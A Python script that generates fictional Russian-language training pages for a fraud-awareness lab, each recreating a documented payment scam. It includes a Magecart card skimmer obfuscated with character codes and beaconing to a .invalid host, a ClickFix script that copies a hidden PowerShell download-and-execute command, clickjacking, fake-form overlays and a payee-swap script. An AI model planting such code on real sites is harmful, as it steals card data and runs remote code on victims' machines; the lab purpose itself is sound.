"""Создаёт реалистичные учебные страницы раздела 2 (lab/scenarios/*.html).

Каждая страница воспроизводит задокументированную схему мошенничества (источник указан
в lab/assets/scenarios-data.js). Бренды, люди и реквизиты вымышлены; реальные платежи невозможны.
"""
from pathlib import Path

OUT = Path(__file__).resolve().parent.parent / 'lab' / 'scenarios'


def site(title, brand, mark, color, nav, crumbs, body, one=False, tail=''):
    return f'''<!doctype html>
<html lang="ru">
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title}</title><link rel="stylesheet" href="scenario.css"><style>:root{{--brand:{color}}}</style></head>
<body>
<div class="bar"><div class="in"><a class="logo" href="#"><i>{mark}</i>{brand}</a>{nav}</div></div>
<div class="sub"><div class="in">{crumbs}</div></div>
<div class="page{' one' if one else ''}">
{body}
</div>
<footer>© 2026 {brand}. Все права защищены. Политика конфиденциальности · Пользовательское соглашение</footer>
<div class="study">Учебный сценарий · вымышленный сайт</div>
{tail}
</body>
</html>
'''


SEARCH = '<div class="search">Поиск по объявлениям</div><nav><span>Мои объявления</span><span>Сообщения</span><span>Профиль</span></nav>'
SHOP_NAV = '<div class="search">Найти товар</div><nav><span>Каталог</span><span>Доставка</span><span>Корзина</span></nav>'
CARD = '''<label for="cc">Номер карты</label><input id="cc" name="cardnumber" autocomplete="cc-number" inputmode="numeric" placeholder="0000 0000 0000 0000">
      <div class="two"><div><label for="exp">Срок действия</label><input id="exp" name="exp-date" autocomplete="cc-exp" placeholder="ММ / ГГ"></div>
      <div><label for="cvc">CVV / CVC</label><input id="cvc" name="cvc" autocomplete="cc-csc" placeholder="•••"></div></div>
      <label for="holder">Имя владельца</label><input id="holder" name="holder" autocomplete="cc-name" placeholder="IVAN IVANOV">'''
TIMER = '<script>(function(){var s=899,e=document.getElementById("t");setInterval(function(){s=Math.max(0,s-1);e.textContent=String(Math.floor(s/60)).padStart(2,"0")+":"+String(s%60).padStart(2,"0")},1000)})();</script>'


def order(items, total, extra=''):
    rows = ''.join(f'<div class="item"><div class="thumb" style="background:{c}">{m}</div><div style="flex:1"><b>{n}</b><div class="muted">{d}</div></div><b>{p}</b></div>' for n, d, p, c, m in items)
    return f'<aside class="panel"><h2>Ваш заказ</h2>{rows}{extra}<div class="total"><span>Итого</span><span>{total}</span></div></aside>'


PAGES = {
    # 1. «Мамонт»: фейковая «безопасная сделка» с доставкой (F6, ESET Telekopye — сценарий покупателя)
    'delivery.html': site('Безопасная сделка — оплата', 'Барахолка', 'Б', '#e2572b', SEARCH,
        'Объявления › Велосипеды › Оформление безопасной сделки', f'''
<section>
  <div class="panel"><div class="steps"><span class="on"></span><span class="on"></span><span></span></div>
    <span class="chip">✓ Безопасная сделка · ПочтаЭкспресс</span>
    <h1>Оплата товара с доставкой</h1>
    <p class="lead">Продавец подтвердил заказ. Деньги будут зарезервированы и переведены продавцу только после того, как вы получите товар.</p>
    <p>Бронь товара истекает через <span class="timer" id="t">14:59</span> — иначе заказ будет отменён.</p></div>
  <form class="panel" action="http://bezopasnaya-sdelka-pay.ru/process" method="post"><h2>Данные карты для оплаты</h2>{CARD}
    <button class="btn" type="submit">Оплатить 7 290 ₽</button>
    <div class="secure">🔒 Платёж защищён · <div class="cards"><span>МИР</span><span>VISA</span><span>MC</span></div></div></form>
</section>
{order([('Велосипед Stels Navigator 500', 'б/у, отличное состояние', '6 900 ₽', '#f97316', '🚲')], '7 290 ₽', '<div class="line"><span>Доставка ПочтаЭкспресс</span><span>390 ₽</span></div>')}''', tail=TIMER),

    # 2. «Мамонт»-продавец: «получите оплату» с вводом CVV и баланса (ESET Telekopye — сценарий продавца)
    'seller-payout.html': site('Получение оплаты', 'Барахолка', 'Б', '#e2572b', SEARCH, 'Сообщения › Покупатель Алексей › Получение средств', f'''
<section class="panel" style="grid-column:1/-1;max-width:640px;margin:auto;width:100%">
  <span class="chip">✓ Покупатель оплатил товар</span>
  <h1>Получите 12 500 ₽ за «Игровая приставка, 1 ТБ»</h1>
  <p class="lead">Покупатель перечислил оплату через безопасную сделку. Чтобы получить средства на карту, укажите её данные. Для подтверждения зачисления потребуется текущий баланс.</p>
  <form action="/payout" method="post">{CARD}
    <label for="bal">Баланс карты</label><input id="bal" name="balance" placeholder="Например, 15 340 ₽">
    <button class="btn" type="submit">Получить 12 500 ₽</button></form>
  <p class="muted">Средства поступят в течение 5 минут. Комиссия не взимается.</p>
</section>'''),

    # 3. «Мамонт-курьер»: подтверждение доставки кодом из SMS + «страховка» (F6, 10.08.2026)
    'courier-code.html': site('Подтверждение доставки', 'КурьерПлюс', 'К', '#6d28d9', '<nav><span>Отследить посылку</span><span>Тарифы</span><span>Поддержка</span></nav>',
        'Отслеживание › KP-77120-4431', f'''
<section>
  <div class="panel"><span class="chip amber">Курьер выехал</span>
    <h1>Посылка KP-77120-4431 будет доставлена сегодня</h1>
    <p class="lead">Чтобы курьер передал посылку, подтвердите адрес и оплатите страховку отправления. Затем введите код из SMS — он подтверждает, что посылку получаете именно вы.</p>
    <label for="addr">Адрес доставки</label><input id="addr" name="address" placeholder="Город, улица, дом, квартира">
    <label for="ph">Телефон</label><input id="ph" name="phone" placeholder="+7 (___) ___-__-__"></div>
  <form class="panel" action="/insurance" method="post"><h2>Страховка отправления — 149 ₽</h2>{CARD}
    <label for="sms">Код из SMS</label><input id="sms" name="sms_code" placeholder="Введите 6 цифр">
    <button class="btn" type="submit">Оплатить и подтвердить</button></form>
</section>
<aside class="panel"><h2>Отправление</h2><div class="line"><span>Откуда</span><span>Казань</span></div><div class="line"><span>Вес</span><span>1,2 кг</span></div>
  <div class="line"><span>Статус</span><span>Передано курьеру</span></div><div class="total"><span>К оплате</span><span>149 ₽</span></div></aside>'''),

    # 4. Фейковый магазин: оплата переводом по телефону «менеджеру» (APP-мошенничество, F6, Банк России)
    'marketplace-transfer.html': site('Оформление заказа', 'ТехноМаркет', 'Т', '#1d4ed8', SHOP_NAV, 'Главная › Смартфоны › Оформление заказа', f'''
<section>
  <div class="panel"><span class="chip red">Скидка −55 % · только сегодня</span>
    <h1>Подтверждение заказа № 88412</h1>
    <p class="lead">Из-за высокой нагрузки онлайн-оплата временно недоступна. Для оформления заказа переведите сумму через СБП по номеру телефона менеджера:</p>
    <p class="req">+7 900 123-45-67<br>Получатель: Дмитрий Олегович К.<br>Сумма: 41 990 ₽</p>
    <p>Заказ резервируется на <span class="timer" id="t">14:59</span>. Осталось 15 минут — иначе бронь будет отменена.</p>
    <p class="muted">После перевода отправьте чек в чат с менеджером. Доставка — завтра.</p></div>
</section>
{order([('Смартфон Nova X12 Pro, 256 ГБ', 'Цвет: графит', '41 990 ₽', '#1d4ed8', 'N')], '41 990 ₽', '<div class="line"><span>Старая цена</span><span><s>93 300 ₽</s></span></div>')}''', tail=TIMER),

    # 5. Поддельный QR на «штрафе» (F6 «Мамонт» закодировался; Kaspersky — подклеенные QR)
    'fine-qr.html': site('Уведомление о штрафе', 'Администратор городских парковок', 'P', '#0f766e', '<nav><span>Штрафы</span><span>Парковки</span><span>Контакты</span></nav>',
        'Штрафы › Постановление № 0355431010126103100', '''
<section class="panel" style="grid-column:1/-1;max-width:760px;margin:auto;width:100%">
  <span class="chip red">Не оплачен · скидка 50 % до 05.11.2026</span>
  <h1>Штраф за неоплату парковки</h1>
  <p class="lead">Постановление № 0355431010126103100 от 29.10.2026. Автомобиль А123ВС 777, ул. Садовая, 14. Сумма штрафа со скидкой: <b>2 500 ₽</b>.</p>
  <div class="qrbox"><img src="img/fine-qr.png" alt="QR-код для оплаты штрафа"><div><h2>Оплатите по QR-коду</h2>
    <p>Откройте приложение банка, выберите «Оплата по QR» и наведите камеру. Реквизиты Администратора парковок подставятся автоматически.</p></div></div>
</section>'''),

    # 6. «Безопасный счёт» (Банк России: самая частая схема социальной инженерии)
    'safe-account.html': site('Служба безопасности', 'Банк «Северный»', 'С', '#b42318', '<nav><span>Частным лицам</span><span>Бизнесу</span><span>Поддержка</span></nav>',
        'Личный кабинет › Служба безопасности › Обращение № 55-1209', '''
<section>
  <div class="panel"><span class="chip red">Срочно: подозрительная операция</span>
    <h1>Ваши сбережения под угрозой</h1>
    <p class="lead">Служба безопасности зафиксировала попытку оформить на вас кредит и вывести деньги. Чтобы сохранить средства, немедленно переведите их на защищённый резервный счёт Банка России. Деньги вернутся после проверки.</p>
    <p class="req">Резервный счёт: 42301810600000054321<br>БИК: 044599123<br>Получатель: Смирнов Олег Андреевич<br>Назначение: перевод собственных средств</p>
    <p>Не сообщайте никому об обращении — злоумышленники могут прослушивать ваш телефон.</p></div>
  <div class="panel"><h2>Подтвердите личность</h2>
    <label for="code">Код из SMS</label><input id="code" name="sms_code" placeholder="6 цифр">
    <label for="word">Кодовое слово</label><input id="word" name="secret_word" placeholder="Кодовое слово из договора">
    <button class="btn">Подтвердить и защитить средства</button></div>
</section>
<aside class="panel"><h2>Сотрудник</h2><p>Старший специалист службы безопасности<br><b>Олег Андреевич</b></p><p class="muted">Обращение будет закрыто автоматически через 30 минут.</p></aside>'''),

    # 7. Веб-скиммер Magecart в настоящем магазине (Akamai, PCI SSC)
    'tea-shop-skimmer.html': site('Оформление заказа', 'Чайная лавка «Белый лист»', 'Ч', '#7a5c2e', SHOP_NAV, 'Главная › Корзина › Оплата', f'''
<form class="panel" action="/checkout/pay" method="post"><div class="steps"><span class="on"></span><span class="on"></span><span class="on"></span></div>
  <h1>Оплата заказа</h1><p class="lead">Проверьте заказ и введите данные карты.</p>{CARD}
  <button class="btn" type="button">Оплатить 1 240 ₽</button>
  <div class="secure">🔒 Соединение защищено · <div class="cards"><span>МИР</span><span>VISA</span><span>MC</span></div></div></form>
{order([('Пуэр «Старое дерево»', '100 г × 2', '880 ₽', '#7a5c2e', '茶'), ('Улун «Молочный»', '50 г × 1', '360 ₽', '#a3864f', '茶')], '1 240 ₽')}''',
        tail='<script src="js/gtm-loader.js"></script>'),

    # 8. Поддельная форма поверх окна платёжного провайдера (Akamai: Magecart с поддельной формой)
    'shoe-shop-overlay.html': site('Оплата', 'Кроссовки.ру', 'К', '#111827', SHOP_NAV, 'Главная › Корзина › Оплата', '''
<section class="panel" id="pay" style="position:relative"><h1>Оплата заказа</h1>
  <p class="lead">Оплата проходит в защищённом окне платёжного провайдера.</p>
  <iframe src="https://pay-psp.test/widget?order=5521" title="Окно оплаты" style="width:100%;height:300px;border:1px solid #e5e7eb;border-radius:12px"></iframe>
</section>''' + order([('Кроссовки Runner Air', 'Размер 42', '8 490 ₽', '#111827', '👟')], '8 490 ₽'),
        tail='<script src="js/checkout-ui.js"></script>'),

    # 9. Кликджекинг: «Крутить колесо» перехватывается невидимым фреймом (CAPEC-103, Zhang et al.)
    'prize-clickjacking.html': site('Колесо удачи', 'Призы24', 'П', '#db2777', '<nav><span>Розыгрыши</span><span>Победители</span></nav>', 'Розыгрыши › Колесо удачи', '''
<section class="panel" style="grid-column:1/-1;max-width:620px;margin:auto;width:100%;text-align:center;position:relative">
  <span class="chip">🎁 Вам доступна 1 попытка</span><h1>Крутите колесо и выиграйте смартфон</h1>
  <div style="width:240px;height:240px;margin:20px auto;border-radius:50%;background:conic-gradient(#db2777 0 25%,#f59e0b 0 50%,#10b981 0 75%,#3b82f6 0);border:8px solid #fff;box-shadow:0 6px 20px rgba(0,0,0,.15)"></div>
  <button class="btn" style="height:60px">Крутить колесо</button>
  <iframe src="clickjack-subscribe.html" title="" style="position:absolute;left:24px;bottom:24px;width:calc(100% - 48px);height:60px;border:0;opacity:0.001"></iframe>
</section>'''),

    'clickjack-subscribe.html': '''<!doctype html><html lang="ru"><meta charset="utf-8"><body style="margin:0">
<form action="/subscription/confirm?plan=premium&charge=1990"><button style="width:100%;height:60px;border:0;background:#111;color:#fff;font:700 16px system-ui">Подтвердить подписку 1 990 ₽/мес</button></form></body></html>''',

    # 10. Подмена реквизитов в счёте после загрузки (ATT&CK T1185 / T1565.002)
    'invoice-swap.html': site('Счёт на оплату', 'ООО «СтройКомплект»', 'С', '#0f766e', '<nav><span>Каталог</span><span>Оптовикам</span><span>Контакты</span></nav>', 'Личный кабинет › Счета › № 2026-1044', '''
<section class="panel" style="grid-column:1/-1;max-width:760px;margin:auto;width:100%">
  <h1>Счёт на оплату № 2026-1044 от 30.10.2026</h1>
  <p class="lead">Поставка: газобетонные блоки D500, 12 м³ — <b>86 400 ₽</b>. Оплатите по реквизитам организации до 05.11.2026.</p>
  <p class="req">Получатель: ООО «СтройКомплект»<br>ИНН 7701234560<br>Расчётный счёт: <span id="acc">40702810700000098765</span><br>БИК: 044599123<br>Банк: АО «Банк Северный»</p>
  <p class="muted">Счёт сформирован автоматически. По вопросам оплаты: отдел продаж, доб. 214.</p>
</section>''', tail='<script src="js/invoice-widget.js"></script>'),

    # 11. Честный магазин: СБП-QR НСПК с суммой, совпадающей с заказом
    'honest-shop.html': site('Оплата заказа', 'Кофейня «Зерно»', 'З', '#7c2d12', SHOP_NAV, 'Главная › Корзина › Оплата', '''
<section class="panel"><h1>Оплата заказа № 3021</h1><p class="lead">Оплатите заказ по QR-коду Системы быстрых платежей — без ввода карты.</p>
  <div class="qrbox"><img src="img/shop-sbp.png" alt="QR СБП"><div><p>Отсканируйте код камерой телефона. Банк покажет получателя: ООО «Зерно».</p>
  <p class="muted">Или оплатите картой на странице платёжного провайдера.</p></div></div>
  <a class="btn alt" href="https://pay-psp.test/checkout?order=3021">Оплатить картой</a></section>''' +
        order([('Кофе в зёрнах «Колумбия»', '1 кг', '1 240 ₽', '#7c2d12', '☕')], '1 240 ₽')),

    # 12. Честная квитанция ЖКУ с правильным QR по ГОСТ
    'honest-receipt.html': site('Квитанция', 'ООО «УК Уютный дом»', 'У', '#0e7490', '<nav><span>Жителям</span><span>Показания</span><span>Контакты</span></nav>', 'Личный кабинет › Квитанции › Октябрь 2026', '''
<section class="panel" style="grid-column:1/-1;max-width:760px;margin:auto;width:100%">
  <h1>Квитанция за октябрь 2026</h1><p class="lead">Управляющая компания ООО «УК Уютный дом», лицевой счёт 100245, кв. 41.</p>
  <div class="line"><span>Содержание жилья</span><span>2 100 ₽</span></div><div class="line"><span>Отопление</span><span>1 850 ₽</span></div>
  <div class="total"><span>К оплате</span><span>3 950 ₽</span></div>
  <div class="qrbox" style="margin-top:18px"><img src="img/receipt-qr.png" alt="QR-код квитанции"><p>Отсканируйте QR-код в приложении банка — реквизиты подставятся автоматически.</p></div>
</section>'''),

    # 13. ClickFix: поддельная капча перед оплатой билетов (ESET H1 2025, Microsoft 2025)
    'clickfix-tickets.html': site('Проверка перед оплатой', 'КиноБилет', 'К', '#be123c', '<nav><span>Афиша</span><span>Кинотеатры</span><span>Мои билеты</span></nav>', 'Афиша › «Северное сияние» › Оплата', """
<section class="panel" style="grid-column:1/-1;max-width:560px;margin:auto;width:100%;text-align:center">
  <h1>Проверка безопасности</h1><p class="lead">Перед оплатой 2 билетов (1 380 ₽) подтвердите, что вы не робот.</p>
  <button class="btn" id="cap" style="max-width:280px;margin:20px auto">☐ Я не робот</button>
  <div id="steps" style="text-align:left;background:#f9fafb;border-radius:12px;padding:16px">
    <b>Пройдите проверку в 3 шага:</b><p>1. Нажмите клавиши <b>Win + R</b></p><p>2. В появившемся окне нажмите <b>Ctrl + V</b></p><p>3. Нажмите <b>Enter</b> — проверка завершится автоматически</p></div>
</section>""", tail='<script src="js/captcha-check.js"></script>'),

    # 14. Фейковое приложение банка + удалённый доступ (F6: NFCGate, ESET: NGate)
    'bank-app-nfc.html': site('Защита счёта', 'Банк «Северный»', 'С', '#b42318', '<nav><span>Частным лицам</span><span>Бизнесу</span><span>Поддержка</span></nav>', 'Служба безопасности › Обращение № 77-310', """
<section>
  <div class="panel"><span class="chip red">Подозрительная операция: −48 000 ₽</span><h1>Отмените списание за 15 минут</h1>
    <p class="lead">Мошенники пытаются списать деньги с вашей карты. Чтобы отменить операцию, установите приложение «Северный Защита», откройте его и приложите карту к задней стороне телефона.</p>
    <a class="btn" href="files/severny-zashita-2.4.apk" download>Скачать «Северный Защита» (.apk, 8 МБ)</a>
    <p class="muted">Если установка не получается, установите RustDesk и продиктуйте специалисту номер подключения.</p></div>
</section>
<aside class="panel"><h2>Специалист</h2><p>Ведущий специалист отдела защиты клиентов<br><b>Алина Сергеевна</b></p><p class="muted">Не кладите трубку.</p></aside>"""),

    # 15. Browser-in-the-Browser на маркетплейсе (mr.d0x 2022, Unit 42 2026)
    'bitb-login.html': site('Оплата заказа', 'ТехноМаркет', 'Т', '#1d4ed8', SHOP_NAV, 'Главная › Корзина › Оплата', """
<section class="panel"><h1>Оплата заказа № 90217</h1><p class="lead">Войдите через банк — оплата в одно касание, без ввода карты.</p>
  <button class="btn">Войти через Банк «Северный» ID</button></section>""" + order([('Наушники Nova Buds 3', 'Цвет: белый', '12 490 ₽', '#1d4ed8', '🎧')], '12 490 ₽') + """
<div style="position:fixed;left:50%;top:70px;transform:translateX(-50%);width:440px;height:420px;background:#fff;border:1px solid #c8ccd4;border-radius:10px;box-shadow:0 30px 80px rgba(0,0,0,.35);z-index:10">
  <div style="background:#f1f3f4;padding:9px 14px;border-radius:10px 10px 0 0;display:flex;justify-content:space-between;font-size:13px"><span>Вход — Банк «Северный» ID</span><span>— ▢ ✕</span></div>
  <div style="margin:6px 10px;padding:7px 12px;background:#f1f3f4;border-radius:18px;font-size:13px;color:#202124">🔒 https://id.bank-severny.ru/oauth/authorize</div>
  <div style="padding:16px 24px"><h2 style="color:#b42318">Банк «Северный» ID</h2>
    <label>Телефон или логин</label><input name="login"><label>Пароль</label><input type="password" name="password">
    <button class="btn" style="background:#b42318">Войти и оплатить 12 490 ₽</button></div></div>"""),

    # 16. Письмо-уведомление со ссылкой на домен-двойник (CAPEC-632)
    'homograph-mail.html': site('Входящие', 'Почта.Онлайн', 'П', '#2563eb', '<div class="search">Поиск в почте</div><nav><span>Входящие</span><span>Отправленные</span></nav>', 'Входящие › Банк «Северный»', """
<section class="panel" style="grid-column:1/-1;max-width:760px;margin:auto;width:100%">
  <p class="muted">От: Банк «Северный» &lt;notify@bank-severny.info&gt; · сегодня, 09:14</p>
  <h1>Подтвердите данные, чтобы карта не была заблокирована</h1>
  <p class="lead">Уважаемый клиент! В связи с обновлением правил необходимо подтвердить данные до 05.11.2026. Иначе карта будет заблокирована.</p>
  <a class="btn" href="https://bank-s\u0435verny.ru/login" style="max-width:320px">Перейти в bank-severny.ru</a>
  <p class="muted">Это письмо сформировано автоматически.</p>
</section>"""),
}

JS = {
    # Скиммер маскируется под загрузчик аналитики; адрес собран из кодов символов.
    'gtm-loader.js': '''/* gtm-loader 3.4.1 — учебный пример веб-скиммера (Magecart). Адрес .invalid не существует, данные никуда не уходят. */
(function(){var _h=String.fromCharCode(104,116,116,112,115,58,47,47,99,100,110,45,103,116,109,45,115,116,97,116,115,46,105,110,118,97,108,105,100,47,99);
var _d={};document.addEventListener('change',function(e){var t=e.target;if(t&&t.autocomplete&&t.autocomplete.indexOf('cc-')===0){_d[t.name]=t.value;
navigator.sendBeacon(_h,JSON.stringify(_d));}},true);})();
''',
    # Поддельная форма рисуется поверх окна провайдера через секунду после загрузки.
    'checkout-ui.js': '''/* Учебный пример: внедрённый код рисует поддельную форму оплаты поверх окна платёжного провайдера. */
setTimeout(function () {
  var f = document.createElement('form');
  f.style.cssText = 'position:absolute;left:24px;right:24px;top:118px;height:300px;background:#fff;border:1px solid #e5e7eb;border-radius:12px;padding:16px';
  f.innerHTML = '<b>Оплата картой</b><label>Номер карты</label><input name="cardnumber" autocomplete="cc-number" placeholder="0000 0000 0000 0000">' +
    '<div class="two"><div><label>Срок</label><input name="exp" autocomplete="cc-exp" placeholder="ММ/ГГ"></div><div><label>CVV</label><input name="cvv" autocomplete="cc-csc" placeholder="•••"></div></div>' +
    '<button class="btn" type="button">Оплатить 8 490 ₽</button>';
  document.getElementById('pay').appendChild(f);
}, 1000);
''',
    'invoice-widget.js': '''/* Учебный пример: через 2 секунды вредоносный код подставляет счёт подставного лица. */
setTimeout(function () { document.getElementById('acc').textContent = '40817810300000067890'; }, 2000);
''',
}

JS['captcha-check.js'] = """/* Учебный пример ClickFix: по нажатию кладёт в буфер команду PowerShell. Адрес .invalid не существует. */
document.getElementById('cap').addEventListener('click', function () {
  navigator.clipboard.writeText('powershell -w h -nop -c "iwr https://cdn-verify.invalid/check.ps1 | iex" # reCAPTCHA ID 88213');
  this.textContent = '\u2611 Проверка почти завершена';
});
"""


if __name__ == '__main__':
    from scenario_design import style_page, make_artwork
    make_artwork()
    (OUT / 'js').mkdir(parents=True, exist_ok=True)
    for name, html in PAGES.items():
        (OUT / name).write_text(style_page(name, html), encoding='utf-8')
    for name, code in JS.items():
        (OUT / 'js' / name).write_text(code, encoding='utf-8')
    print('Сценариев:', len(PAGES), 'скриптов:', len(JS))
